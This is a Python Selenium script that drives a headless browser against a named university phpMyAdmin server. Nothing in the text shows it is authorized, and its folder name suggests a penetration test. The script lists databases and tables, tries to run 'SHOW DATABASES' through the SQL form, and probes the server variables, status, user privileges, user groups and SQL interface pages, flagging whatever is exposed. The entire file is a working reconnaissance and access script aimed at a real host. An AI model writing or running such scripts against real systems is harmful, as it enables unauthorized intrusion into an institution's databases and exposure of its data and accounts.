#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time, re

opts = Options()
opts.add_argument('--headless')
opts.add_argument('--no-sandbox')
opts.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options=opts)

try:
    # Access /server/databases route
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases')
    time.sleep(3)
    
    page_source = driver.page_source
    tc = re.sub(r'<[^>]+>', ' ', page_source)
    tc = re.sub(r'\s+', ' ', tc).strip()
    print(f"/server/databases length: {len(tc)}")
    print(f"Content: {tc[:1000]}")
    print()
    
    # Look for database names
    db_names = re.findall(r'(?:mysql|information_schema|phpmyadmin|uns|registro|sistemas)[^<,"]*', tc, re.IGNORECASE)
    print(f"Database names found: {db_names}")
    print()
    
    # Look for table rows
    tr_elements = driver.find_elements(By.TAG_NAME, 'tr')
    print(f"Table rows: {len(tr_elements)}")
    for tr in tr_elements[:10]:
        text = tr.text.strip()
        if text and len(text) > 2:
            print(f"  Row: {text[:100]}")
    
    # Look for td elements with database names
    td_elements = driver.find_elements(By.TAG_NAME, 'td')
    print(f"\nTD elements: {len(td_elements)}")
    for td in td_elements[:20]:
        text = td.text.strip()
        if text:
            print(f"  TD: {text[:100]}")
    
    # Look for links
    links = driver.find_elements(By.TAG_NAME, 'a')
    print(f"\nLinks: {len(links)}")
    for link in links[:20]:
        href = link.get_attribute('href')
        text = link.text.strip()
        if text:
            print(f"  Link: {text} -> {href}")
    
    # Try to access different database routes
    print("\n=== RUTAS DE BASES DE DATOS ===\n")
    db_routes = [
        'index.php?route=/server/databases/data&db=mysql',
        'index.php?route=/server/databases/data&db=information_schema',
        'index.php?route=/server/databases/data&db=phpmyadmin',
        'index.php?route=/server/databases/data',
    ]
    
    for route in db_routes:
        driver.get(f'https://orcl.uns.edu.pe/{route}')
        time.sleep(3)
        tc_route = driver.page_source
        tc_route_clean = re.sub(r'<[^>]+>', ' ', tc_route)
        tc_route_clean = re.sub(r'\s+', ' ', tc_route_clean).strip()
        print(f"Route: {route}")
        print(f"  Length: {len(tc_route_clean)}")
        
        # Look for tables in this route
        td_route = driver.find_elements(By.TAG_NAME, 'td')
        td_text = [t.text.strip() for t in td_route if t.text.strip()]
        if td_text:
            print(f"  TD data: {td_text[:10]}")
        
        # Check if we see database tables
        if 'table' in tc_route_clean.lower() and 'information_schema' not in tc_route_clean.lower():
            table_names = re.findall(r'<a[^>]*>([^<]+)</a>', tc_route_clean)
            print(f"  Table names: {table_names[:10]}")
        
        print()
    
    # Try to execute SQL query
    print("=== EJECUTAR CONSULTA SQL ===\n")
    try:
        # Find the SQL input by trying different selectors
        sql_input = driver.find_element(By.NAME, 'sql')
        sql_input.clear()
        sql_input.send_keys('SHOW DATABASES')
        time.sleep(2)
        
        # Find the Go button
        go_buttons = driver.find_elements(By.XPATH, '//input[@type="submit"]')
        for btn in go_buttons:
            if 'Go' in btn.text or 'Go' in btn.get_attribute('value'):
                btn.click()
                time.sleep(5)
                break
        
        tc_sql = driver.page_source
        tc_sql_clean = re.sub(r'<[^>]+>', ' ', tc_sql)
        tc_sql_clean = re.sub(r'\s+', ' ', tc_sql_clean).strip()
        print(f"SQL result length: {len(tc_sql_clean)}")
        print(f"SQL result: {tc_sql_clean[:500]}")
        
        # Look for database names in the result
        if 'mysql' in tc_sql_clean.lower():
            print("\n[!] Database names visible!")
            db_names_sql = re.findall(r'(?:mysql|information_schema|phpmyadmin)[^<,"]*', tc_sql_clean, re.IGNORECASE)
            print(f"  Databases: {db_names_sql}")
        
    except Exception as e:
        print(f"SQL execution error: {e}")
        # Try alternative approach - click on the SQL tab
        try:
            sql_tab = driver.find_element(By.LINK_TEXT, 'SQL')
            sql_tab.click()
            time.sleep(3)
            
            # Find the SQL input
            sql_inputs = driver.find_elements(By.TAG_NAME, 'textarea')
            if sql_inputs:
                sql_inputs[0].send_keys('SHOW DATABASES')
                time.sleep(2)
                
                # Submit
                submit_buttons = driver.find_elements(By.TAG_NAME, 'button')
                for btn in submit_buttons:
                    if 'Go' in btn.text:
                        btn.click()
                        time.sleep(5)
                        break
            
            tc_sql2 = driver.page_source
            tc_sql2_clean = re.sub(r'<[^>]+>', ' ', tc_sql2)
            tc_sql2_clean = re.sub(r'\s+', ' ', tc_sql2_clean).strip()
            print(f"\nSQL result 2: {tc_sql2_clean[:500]}")
            
        except Exception as e2:
            print(f"Alternative SQL error: {e2}")
    
    # Try to access the server variables
    print("\n=== VARIABLES DEL SERVIDOR ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/variables')
    time.sleep(3)
    tc_vars = driver.page_source
    tc_vars_clean = re.sub(r'<[^>]+>', ' ', tc_vars)
    tc_vars_clean = re.sub(r'\s+', ' ', tc_vars_clean).strip()
    print(f"Variables length: {len(tc_vars_clean)}")
    if 'version' in tc_vars_clean.lower():
        print("[!] Server variables accessible!")
        version_info = re.findall(r'(?:Version|version|MySQL|MariaDB)[^<]*', tc_vars_clean, re.IGNORECASE)
        print(f"  Version info: {version_info[:10]}")
    
    # Try to access the server status
    print("\n=== ESTADO DEL SERVIDOR ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/status')
    time.sleep(3)
    tc_status = driver.page_source
    tc_status_clean = re.sub(r'<[^>]+>', ' ', tc_status)
    tc_status_clean = re.sub(r'\s+', ' ', tc_status_clean).strip()
    print(f"Status length: {len(tc_status_clean)}")
    
    # Try to access user privileges
    print("\n=== PRIVILEGIOS ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/privileges')
    time.sleep(3)
    tc_priv = driver.page_source
    tc_priv_clean = re.sub(r'<[^>]+>', ' ', tc_priv)
    tc_priv_clean = re.sub(r'\s+', ' ', tc_priv_clean).strip()
    print(f"Privileges length: {len(tc_priv_clean)}")
    
    # Try to access user groups
    print("\n=== GRUPOS DE USUARIOS ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/user-groups')
    time.sleep(3)
    tc_ug = driver.page_source
    tc_ug_clean = re.sub(r'<[^>]+>', ' ', tc_ug)
    tc_ug_clean = re.sub(r'\s+', ' ', tc_ug_clean).strip()
    print(f"User groups length: {len(tc_ug_clean)}")
    
    # Try to access the SQL interface
    print("\n=== INTERFAZ SQL ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/sql')
    time.sleep(3)
    tc_sql_route = driver.page_source
    tc_sql_route_clean = re.sub(r'<[^>]+>', ' ', tc_sql_route)
    tc_sql_route_clean = re.sub(r'\s+', ' ', tc_sql_route_clean).strip()
    print(f"SQL interface length: {len(tc_sql_route_clean)}")
    if 'sql' in tc_sql_route_clean.lower():
        print("[!] SQL interface accessible!")
    
    # Take a full screenshot
    driver.save_screenshot('C:\\Users\\Leguion T\\Desktop\\plan te pent\\prueba\\phpmysql_full.png')
    print("\nScreenshot saved!")
    
finally:
    driver.quit()

print("\n=== FIN ===")
